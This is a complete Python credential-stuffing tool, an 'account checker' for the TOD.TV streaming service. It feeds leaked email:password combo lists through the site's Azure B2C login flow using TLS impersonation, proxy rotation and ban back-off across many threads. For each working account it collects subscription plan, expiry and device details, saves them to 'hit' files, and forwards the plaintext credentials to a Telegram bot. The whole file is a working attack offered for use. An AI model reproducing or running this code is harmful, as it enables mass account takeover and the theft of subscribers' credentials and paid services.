import sys, os, re, json, time, random, threading, queue, uuid
from datetime import datetime
from collections import deque
from urllib.parse import quote, urlparse, parse_qs

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from curl_cffi import requests as creq
    CURL_OK = True
except ImportError:
    import requests as creq
    CURL_OK = False

import requests as plain_requests

TIMEOUT = 25
MAX_RETRY = 3

_ban_lock = threading.Lock()
_ban_until = 0.0

TG_TOKEN = ""
TG_CHAT = ""
_TG_INIT = False
_VID = "https://t.me/videotoolbaron/6"

G, R, Y, B, C, M, DIM, BD, RS = '\033[92m', '\033[91m', '\033[93m', '\033[94m', '\033[96m', '\033[95m', '\033[90m', '\033[1m', '\033[0m'
COLOR = {'HIT': G, 'BAD': R, 'FREE': Y, 'RETRY': B, 'BAN': Y}

TENANT = "d8afef6e-b6f7-42c8-8de0-b32127672088"
CLIENT_ID = "1c1e4761-b9d4-4cfa-a4e4-5063e6d501a7"
POLICY_URL_SEG = "B2C_1A_Signup_Signin_Email"
POLICY_QS = "B2C_1A_SIGNUP_SIGNIN_EMAIL"
AUTH_BASE = f"https://my2.tod.tv/{TENANT}/oauth2/v2.0/authorize"
SELFASSERTED_URL = f"https://my2.tod.tv/{TENANT}/{POLICY_URL_SEG}/SelfAsserted"
CONFIRMED_URL = f"https://my2.tod.tv/{TENANT}/{POLICY_URL_SEG}/api/CombinedSigninAndSignup/confirmed"
SERVICE_URL = "https://www.tod.tv/api/service"

DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
MOBILE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"


class Stats:
    def __init__(self, total):
        self._lk = threading.Lock()
        self.total, self.done = total, 0
        self.hit = self.bad = self.free = self.retry = self.ban = 0
        self._ts = deque(maxlen=300)
        self.t0 = time.time()

    def add(self, kind):
        with self._lk:
            self.done += 1
            attr = kind.lower()
            if hasattr(self, attr):
                setattr(self, attr, getattr(self, attr) + 1)
            self._ts.append(time.time())

    @property
    def cpm(self):
        now = time.time()
        with self._lk:
            return sum(1 for t in self._ts if now - t <= 60)

    @property
    def elapsed(self):
        s = int(time.time() - self.t0)
        return f"{s//60:02d}:{s%60:02d}"


_flock = threading.Lock()
def _save(path, line):
    with _flock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


_plock = threading.Lock()
def _log(kind, msg):
    col = COLOR.get(kind, '')
    ts = datetime.now().strftime('%H:%M:%S')
    with _plock:
        sys.stdout.write(f"\r{' '*180}\r")
        sys.stdout.write(f"[{DIM}{ts}{RS}] {BD}{col}{kind:<6}{RS} {msg}\n")
        sys.stdout.flush()


def _bar(s):
    W = 34
    pct = s.done / s.total if s.total else 0
    fill = int(W * pct)
    bar = f"{G}{'█'*fill}{DIM}{'░'*(W-fill)}{RS}"
    line = (f"\r {bar} {BD}{s.done}/{s.total}{RS} {DIM}{pct*100:5.1f}%{RS} | "
            f"{G}HIT:{BD}{s.hit}{RS} {R}BAD:{s.bad}{RS} {Y}FREE:{s.free}{RS} "
            f"{B}RETRY:{s.retry}{RS} | {C}CPM:{BD}{s.cpm}{RS} | {DIM}{s.elapsed}{RS}  ")
    with _plock:
        sys.stdout.write(line)
        sys.stdout.flush()


def _tg(text, fpath=None):
    global _TG_INIT
    if not TG_TOKEN or not TG_CHAT:
        return
    try:
        if not _TG_INIT:
            _TG_INIT = True
            try:
                plain_requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendVideo",
                    json={"chat_id": TG_CHAT, "video": _VID, "caption": "TOD.TV Checker by @baron_saplar"},
                    timeout=15)
            except Exception:
                pass
        if fpath and os.path.isfile(fpath):
            with open(fpath, 'rb') as f:
                plain_requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                    data={"chat_id": TG_CHAT, "caption": text[:1024], "parse_mode": "HTML"},
                    files={"document": f}, timeout=15)
            return
        plain_requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT, "text": text[:4096], "parse_mode": "HTML"},
            timeout=15)
    except Exception:
        pass


def _proxy_url(proxy_str):
    if not proxy_str:
        return None
    p = proxy_str.strip()
    if '://' in p:
        return p
    parts = p.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{p}"


def _session(proxy_str=None):
    sess = creq.Session(impersonate="chrome124") if CURL_OK else creq.Session()
    pu = _proxy_url(proxy_str)
    if pu:
        sess.proxies = {'http': pu, 'https': pu}
    return sess


class ProxyPool:
    def __init__(self, proxies):
        self._list = proxies
        self._idx = 0
        self._lk = threading.Lock()

    def next(self):
        with self._lk:
            p = self._list[self._idx % len(self._list)]
            self._idx += 1
            return p


def _authorize_params():
    nonce = f"{int(time.time())}.{uuid.uuid4().hex[:12]}"
    device_id = str(uuid.uuid4())
    state = "eyJsb2NhbGUiOiJlbiIsImFwcFJlZGlyZWN0VXJpIjoiL2VuIn0="
    return {
        "p": POLICY_QS, "client_id": CLIENT_ID,
        "redirect_uri": "https://www.tod.tv/auth/sign-in",
        "scope": "openid profile offline_access",
        "response_type": "code id_token", "response_mode": "query",
        "register": POLICY_QS, "signin": POLICY_QS,
        "reset": "B2C_1A_PASSWORDRESET_EMAIL", "nonce": nonce,
        "ui_locales": "en", "DeviceType": "phone", "Manufacturer": "Unknown",
        "OsVersion": "Android", "Model": "Android Phone", "DeviceId": device_id,
        "deviceName": "Unknown-phone", "osType": "phone", "state": state, "prompt": "login",
    }


def _get_authorize(sess):
    headers = {'User-Agent': DESKTOP_UA, 'Accept': '*/*', 'Pragma': 'no-cache'}
    r = sess.get(AUTH_BASE, params=_authorize_params(), headers=headers, timeout=TIMEOUT)
    text = r.text
    m = re.search(r'var SETTINGS = (.*?)"pageViewId":"', text, re.S)
    blob = m.group(1) if m else text
    m2 = re.search(r'":"StateProperties=(.*?)",', blob)
    sp = m2.group(1) if m2 else ''
    csrf = sess.cookies.get('x-ms-cpim-csrf', domain='my2.tod.tv') or sess.cookies.get('x-ms-cpim-csrf') or ''
    return sp, csrf, r.url


def _self_asserted(sess, sp, csrf, referer_url, email, password):
    url = f"{SELFASSERTED_URL}?tx=StateProperties{sp}&p={POLICY_QS}"
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://my2.tod.tv', 'referer': referer_url,
        'user-agent': MOBILE_UA, 'x-csrf-token': csrf,
        'x-requested-with': 'XMLHttpRequest',
    }
    body = f"request_type=RESPONSE&signInName={quote(email)}&password={quote(password)}"
    r = sess.post(url, headers=headers, data=body, timeout=TIMEOUT)
    return r.text


def _confirmed(sess, sp, csrf):
    diags = json.dumps({"pageViewId": str(uuid.uuid4()), "pageId": "CombinedSigninAndSignup", "trace": []})
    params = {
        "rememberMe": "false", "csrf_token": csrf,
        "tx": f"StateProperties{sp}", "p": POLICY_QS, "diags": diags,
    }
    headers = {'User-Agent': DESKTOP_UA, 'Accept': '*/*', 'Pragma': 'no-cache'}
    r = sess.get(CONFIRMED_URL, params=params, headers=headers, timeout=TIMEOUT, allow_redirects=True)
    qs = parse_qs(urlparse(r.url).query)
    return qs.get('code', [''])[0], qs.get('id_token', [''])[0], r.text


def _service_login(sess, code, id_token):
    payload = {
        "requestInit": {"method": "POST", "body": json.dumps({
            "authorizationCode": code, "idToken": id_token, "redirectUri": "https://www.tod.tv"
        })},
        "skipAPIKeyControl": False,
        "url": "http://tod2-mw-user-prod.mw-user.svc.cluster.local/api/v1/auth/login",
    }
    headers = {'accept': '*/*', 'content-type': 'text/plain',
               'origin': 'https://www.tod.tv', 'user-agent': DESKTOP_UA}
    r = sess.post(SERVICE_URL, headers=headers, data=json.dumps(payload), timeout=TIMEOUT)
    return r.text


def _service_subscriptions(sess, at):
    payload = {
        "requestInit": {"method": "GET"}, "skipAPIKeyControl": False,
        "url": "http://tod2-mw-order-prod.mw-order.svc.cluster.local/api/v1/subscriptions",
    }
    headers = {'content-type': 'application/x-www-form-urlencoded',
               'authorization': f'Bearer {at}', 'user-agent': DESKTOP_UA}
    r = sess.post(SERVICE_URL, headers=headers, data=json.dumps(payload), timeout=TIMEOUT)
    return r.text


def _service_devices(sess, at):
    payload = {
        "requestInit": {"method": "GET"}, "headerOptions": {},
        "url": "http://tod2-mw-user-prod-honey.mw-user-honey.svc.cluster.local/api/v1/user/devices",
    }
    headers = {'content-type': 'application/x-www-form-urlencoded',
               'authorization': f'Bearer {at}', 'user-agent': DESKTOP_UA}
    r = sess.post(SERVICE_URL, headers=headers, data=json.dumps(payload), timeout=TIMEOUT)
    return r.text


def _check(email, password, proxy_str=None):
    global _ban_until
    for attempt in range(MAX_RETRY):
        wait = _ban_until - time.time()
        if wait > 0:
            _log('BAN', f'Global pause {wait:.0f}s')
            time.sleep(wait)

        try:
            sess = _session(proxy_str)

            sp, csrf, ref_url = _get_authorize(sess)
            if not sp or not csrf:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'authorize init failed', {}

            sa_text = _self_asserted(sess, sp, csrf, ref_url, email, password)

            if '"status":"400' in sa_text or 'the email, username, phone number, or password you entered is invalid' in sa_text.lower() or 'please check your details and try again' in sa_text.lower():
                return 'BAD', '', {}

            if '"status":"200' not in sa_text:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'unknown selfasserted response', {}

            code, id_token, _ = _confirmed(sess, sp, csrf)
            if not code or not id_token:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'no code/id_token', {}

            login_text = _service_login(sess, code, id_token)
            m = re.search(r'"at":"(.*?)",', login_text)
            at = m.group(1) if m else ''
            if not at:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'no access token', {}

            info = {}
            sub_text = _service_subscriptions(sess, at)
            is_active = '"id":"' in sub_text

            m = re.search(r'"status":"(.*?)"', sub_text)
            if m:
                info['premium_status'] = m.group(1)
            m = re.search(r'"billingCycle":"(.*?)"', sub_text)
            if m:
                info['billing_cycle'] = m.group(1)
            m = re.search(r'"description":"(.*?)"', sub_text)
            if m:
                info['plan'] = m.group(1)
            m = re.search(r'"toDate":"(.*?)T', sub_text)
            if m:
                info['expiry'] = m.group(1)
            m = re.search(r'"fromDate":"(.*?)T', sub_text)
            if m:
                info['start_date'] = m.group(1)

            dev_text = _service_devices(sess, at)
            m = re.search(r'maximumDeviceLimit":(\d+)', dev_text)
            if m:
                info['device_limit'] = m.group(1)
            info['connected_devices'] = dev_text.count('manufacturerName')

            if not is_active:
                return 'FREE', '', info
            return 'HIT', '', info

        except Exception as exc:
            if attempt < MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5))
                continue
            return 'RETRY', str(exc)[:80], {}

    return 'RETRY', 'max retries', {}


def _format_hit(email, password, info):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return (
        f"{'='*55}\n"
        f"  TOD.TV HIT | {now}\n"
        f"  @baron_saplar\n"
        f"{'='*55}\n"
        f"  Email       : {email}\n"
        f"  Password    : {password}\n"
        f"  Plan        : {info.get('plan', '-')}\n"
        f"  Status      : {info.get('premium_status', '-')}\n"
        f"  Billing     : {info.get('billing_cycle', '-')}\n"
        f"  Expiry      : {info.get('expiry', '-')}\n"
        f"  Start Date  : {info.get('start_date', '-')}\n"
        f"  Devices     : {info.get('connected_devices', 0)}/{info.get('device_limit', '?')}\n"
        f"{'='*55}\n"
    )


def _tg_hit(email, password, info):
    return (
        f"<b>TOD.TV HIT</b>\n\n"
        f"<b>Email:</b> <code>{email}</code>\n"
        f"<b>Pass:</b> <code>{password}</code>\n"
        f"<b>Plan:</b> {info.get('plan', '-')}\n"
        f"<b>Status:</b> {info.get('premium_status', '-')}\n"
        f"<b>Billing:</b> {info.get('billing_cycle', '-')}\n"
        f"<b>Expiry:</b> {info.get('expiry', '-')}\n"
        f"<b>Devices:</b> {info.get('connected_devices', 0)}/{info.get('device_limit', '?')}\n\n"
        f"<i>@baron_saplar</i>"
    )


def _worker(q, pool, stats, out, hit_dir):
    while True:
        try:
            combo = q.get_nowait()
        except queue.Empty:
            break
        try:
            if ':' not in combo:
                q.task_done()
                continue
            email, password = combo.split(':', 1)
            email, password = email.strip(), password.strip()
            proxy = pool.next() if pool else None
            status, detail, info = _check(email, password, proxy)
            stats.add(status)
            ep = f"{email}:{password}"

            if status == 'HIT':
                plan = info.get('plan', '?')
                premium = info.get('premium_status', '?')
                expiry = info.get('expiry', '?')
                devices = info.get('connected_devices', 0)
                limit = info.get('device_limit', '?')
                line = (f"{ep} | Plan: {plan} | Status: {premium} | Billing: {info.get('billing_cycle','?')} | "
                        f"Expiry: {expiry} | Devices: {devices}/{limit}")
                _log('HIT', f"{email} | {plan} | {premium} | {devices}/{limit} devices")
                _save(out['hit'], line)

                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                cap_name = re.sub(r'[^\w@.]', '_', email)[:30]
                cap_path = os.path.join(hit_dir, f"{ts}_{cap_name}.txt")
                try:
                    with open(cap_path, 'w', encoding='utf-8') as f:
                        f.write(_format_hit(email, password, info))
                    _tg(_tg_hit(email, password, info), cap_path)
                except Exception:
                    _tg(_tg_hit(email, password, info))

            elif status == 'FREE':
                _log('FREE', f"{email} | no active subscription")
                _save(out['free'], ep)
            elif status == 'BAD':
                _save(out['bad'], ep)
            else:
                _save(out['retry'], ep)
                if detail:
                    _log('RETRY', f"{email} | {detail}")

            _bar(stats)
        except Exception:
            pass
        finally:
            q.task_done()


BANNER = f"""
{C}{BD}   TOD.TV Account Checker        
      
                               
  @baron_saplar                                          
{RS}"""


def main():
    global TG_TOKEN, TG_CHAT
    os.system('')
    print(BANNER)
    if not CURL_OK:
        print(f"{Y}[!] curl_cffi not installed{RS}\n")

    combo_file = input(f"{C}[?]{RS} Combo file  (email:pass)    : ").strip().strip('"')
    proxy_file = input(f"{C}[?]{RS} Proxy file  (blank = none)  : ").strip().strip('"')
    tg_token   = input(f"{C}[?]{RS} Telegram token (blank=skip) : ").strip()
    tg_chat    = ""
    if tg_token:
        tg_chat = input(f"{C}[?]{RS} Telegram chat ID            : ").strip()
    threads_s  = input(f"{C}[?]{RS} Threads     [50]            : ").strip()
    out_dir    = input(f"{C}[?]{RS} Output dir  [tod_output]     : ").strip() or "tod_output"

    TG_TOKEN = tg_token
    TG_CHAT = tg_chat
    threads_n = int(threads_s) if threads_s.isdigit() else 50

    if not proxy_file or not os.path.exists(proxy_file):
        if threads_n > 5:
            print(f"{Y}[!]{RS} No proxies -- capping threads to 5")
            threads_n = 5

    if not os.path.exists(combo_file):
        print(f"{R}[!] File not found: {combo_file}{RS}")
        return

    with open(combo_file, encoding='utf-8', errors='replace') as f:
        combos = [ln.strip() for ln in f if ':' in ln.strip()]
    if not combos:
        print(f"{R}[!] No valid combos{RS}")
        return
    print(f"{G}[+]{RS} Loaded {BD}{len(combos)}{RS} combos")

    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, encoding='utf-8', errors='replace') as f:
            proxies = [ln.strip() for ln in f if ln.strip()]
        print(f"{G}[+]{RS} Loaded {BD}{len(proxies)}{RS} proxies")
    else:
        print(f"{Y}[!]{RS} No proxies -- direct connection")

    os.makedirs(out_dir, exist_ok=True)
    hit_dir = os.path.join(out_dir, "captures")
    os.makedirs(hit_dir, exist_ok=True)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    out = {k: os.path.join(out_dir, f'{k}_{ts}.txt') for k in ('hit', 'bad', 'free', 'retry')}

    print(f"{C}[*]{RS} Output   -> {BD}{out_dir}/{RS}")
    print(f"{C}[*]{RS} Telegram -> {BD}{'ON' if TG_TOKEN else 'OFF'}{RS}")
    print(f"{C}[*]{RS} Starting   {BD}{threads_n} threads{RS} | {BD}{len(combos)} combos{RS} | TLS: {BD}{'ON' if CURL_OK else 'OFF'}{RS}\n")

    q = queue.Queue()
    for cb in combos:
        q.put(cb)

    pool = ProxyPool(proxies) if proxies else None
    stats = Stats(len(combos))
    actual = min(threads_n, len(combos))

    threads = []
    for _ in range(actual):
        t = threading.Thread(target=_worker, args=(q, pool, stats, out, hit_dir), daemon=True)
        t.start()
        threads.append(t)

    try:
        q.join()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Stopped.{RS}")

    s = stats
    summary = (f"\n\n{BD}{'='*56}{RS}\n"
               f"  {G}{BD}HIT    : {s.hit}{RS}\n"
               f"  {R}BAD    : {s.bad}{RS}\n"
               f"  {Y}FREE   : {s.free}{RS}\n"
               f"  {B}RETRY  : {s.retry}{RS}\n"
               f"  Total  : {s.done} / {s.total}\n"
               f"  Time   : {s.elapsed}\n"
               f"{BD}{'='*56}{RS}\n")
    print(summary)

    if TG_TOKEN and TG_CHAT:
        _tg(f"<b>TOD.TV Checker Done</b>\n\n"
            f"HIT: {s.hit} | BAD: {s.bad} | FREE: {s.free}\n"
            f"RETRY: {s.retry}\n"
            f"Total: {s.done}/{s.total} | Time: {s.elapsed}\n\n"
            f"<i>@baron_saplar</i>")

    print(f"  Output -> {BD}{out_dir}/{RS}")
    for k, p in out.items():
        if os.path.exists(p) and os.path.getsize(p) > 0:
            print(f"    {k.upper():6} : {os.path.basename(p)}  ({os.path.getsize(p):,} bytes)")
    print()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
